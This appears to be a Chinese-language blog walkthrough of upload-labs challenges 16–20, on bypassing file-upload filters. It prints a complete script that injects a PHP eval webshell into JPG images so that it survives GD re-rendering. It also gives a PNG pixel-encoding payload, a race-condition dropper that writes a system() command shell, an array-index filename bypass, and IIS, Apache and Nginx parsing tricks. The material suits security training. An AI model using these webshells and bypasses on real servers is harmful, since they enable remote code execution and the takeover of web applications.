图片马php_exif本关还是要上传一个图片马，这里用到php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过就不多说。 Pass-16 图片马二次渲染因为上传显示的的图片是二次渲染后生成的新图片，所以之前插入在图片中的代码会被过滤掉，因此上述的图片马无法实现 不同图片不同的绕过方法： gif：先把gif上传后，取出该文件与未修改的文件进行对比 蓝色部分内容为未改变的部分，因此可在蓝色部分中插入木马上传绕过 再上传 被修改的内容未被过滤，成功绕过，再结合文件包含漏洞 jpg：过于复杂，利用脚本处理得到上传图片： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"&lt;?php eval($_POST['DD']); ?&gt;\";//插入的恶意代码 if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) &#123; die('php-gd is not installed'); &#125; if(!isset($argv[1])) &#123; die('php jpg_payload.php &lt;jpg_name.jpg&gt;'); &#125; set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die('Incorrect SOI marker'); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage('payload_'.$argv[1], $outStream)) &#123; die('Success!'); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = ''; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die('End Of File'); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die('End Of File'); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 但有一些jpg图片不能被处理,所以要多尝试一些jpg图片使用脚本处理1.jpg 得到 用16进制编辑器查看 生成的图片中已插入php代码上传该图片码后，插入的php代码未被过滤 png:同样使用脚本处理图片: 123456789101112131415161718192021222324&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,'./1.png');?&gt; 得到 16进制编辑器查看 php代码已插入代码的使用：url： post: 相当于执行命令system(ipconfig) 本关还是要上传一个图片马。 1234567imagecreatefrom 系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串。该系列函数有：imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像 Pass-17 条件竞争1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125; 在if判读不通过unlink文件之前已经用move_uploaded_file函数将文件上传到upload目录下，所以通过bp不断的上传weshell，然后在浏览器中不断的访问总能访问到未被unlink的webshell文件 这里可以使用burp去发包， 即用Burp不断上传，再用burp不断访问 ，在burp中不断发送上传webshell的数据包，可以把文件内容改成下面这样 （就是为了写文件进去就对了） 1234&lt;?php$c=fopen('./cmd.php','w');fwrite($c,'&lt;?php system($_GET[\"f\"]);?&gt;');?&gt; 跑了之后， 就会在该文件夹下面产生新的文件了 访问 Pass18 条件竞争图片马1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192//index.php$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; require_once(\"./myupload.php\"); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = '文件已经被上传，但没有重命名。'; break; case -1: $msg = '这个文件不能上传到服务器的临时文件存储目录。'; break; case -2: $msg = '上传失败，上传目录不可写。'; break; case -3: $msg = '上传失败，无法上传该类型文件。'; break; case -4: $msg = '上传失败，上传的文件过大。'; break; case -5: $msg = '上传失败，服务器已经存在相同名称文件。'; break; case -6: $msg = '文件无法上传，文件不能复制到目标目录。'; break; default: $msg = '未知错误！'; break; &#125;&#125;//myupload.phpclass MyUpload&#123; var $cls_arr_ext_accepted = array( \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\", \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" ); /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( \"SUCCESS\" ); &#125;&#125;; 对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功 Pass-19 00截断POST方式与12题同样的方式 Pass-20 数组加/.绕过123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES['upload_file']))&#123; //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type))&#123; $msg = \"禁止上传该类型文件!\"; &#125;else&#123; //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) &#123; $file = explode('.', strtolower($file)); &#125; $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) &#123; $msg = \"禁止上传该后缀文件!\"; &#125;else&#123; $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = \"文件上传成功！\"; $is_upload = true; &#125; else &#123; $msg = \"文件上传失败！\"; &#125; &#125; &#125;&#125;else&#123; $msg = \"请选择要上传的文件！\";&#125; 首先end函数取所post参数数组中的最后一个值，$file_name = reset($file) . ‘.’ . $file[count($file) - 1]我们可以post一个参数名为一个[0]一个[2]，然后$file[count($file) - 1]就为空，$file_name最终就为reset($file)即$file[0]，就可以绕过判断 抓包： 文件类型修改为图片类型： 漏洞利用： 上传成功： 看了其他大佬的总结，还有其他的一些未见过的解析漏洞IIS 6.0IIS 6.0解析利用又三种： 1.目录解析建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析 2.文件解析后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名) 3.默认解析IIS6.0 默认的可执行文件除了asp还包含这三种 1234/xxx.asa/xxx.cer/xxx.cdx/xxx.apsx IIS 7.0/7.5在正常图片URL后添加 /.php，可以解析为php Apache一般都在2.3.x以下版本，但是有时候配置文件的不同也会导致不安全 后缀解析：test.php.x1.x2.x3Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析test.php.x1.x2.x3则会被解析为php NginxNginx &lt;8.03畸形解析漏洞直接在正常图片URL后添加/.phpNginx &lt;=0.8.37在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞 在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件","categories":[],"tags":[]}]}